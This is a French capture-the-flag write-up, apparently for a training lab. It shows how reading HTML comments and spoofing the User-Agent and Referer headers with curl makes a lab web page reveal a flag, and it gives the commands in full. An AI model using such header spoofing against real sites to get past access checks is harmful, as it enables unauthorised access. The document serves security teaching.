# Spoof Albatros

Sur la page : http://IP/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f

- Inspecter l'élément
- Lire les commentaires 

On peut voir de nombreux commentaires, deux commentaires nous intéressent particulièrement

```
You must come from : "https://www.nsa.gov/".

Let's use this browser : "ft_bornToSec". It will help you a lot.
```



On peut modifier le **user-agent**, qui est l'application qui sert de navigation :
> curl -H "user-agent: ft_bornToSec" ip

Ce qui va remplacer le **user-agent** de notre navigateur (Chrome) par ft_bornToSec

**ressource  :** https://stackoverflow.com/questions/28760694/how-to-use-curl-to-get-a-get-request-exactly-same-as-using-chrome


Les requetes HTTP envoie les informations "Referrer Page" au serveur **HTTP**. Il est possible de modifier le site "Referrer Page", et de dire que nous venions d'un autre site.

Exemples:
```
 curl -e "https://faux.exemple" https://exemple.com
 curl --referer "https://faux.exemple;auto" -L https://exemple.com
```
#### Usefull ressources :

https://curl.se/docs/manpage.html#-e
https://curl.se/docs/manpage.html#-L
https://catonmat.net/cookbooks/curl/add-referrer

Nous allons utiliser les options de CURL pour dire que nous utilisons le navigateur "ft_bornToSec" et que nous venons du site "https://www.nsa.gov/".

```
curl -H "user-agent: ft_bornToSec" -e https://www.nsa.gov/ http://192.168.56.102/index.php\?page\=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f | grep flag
```
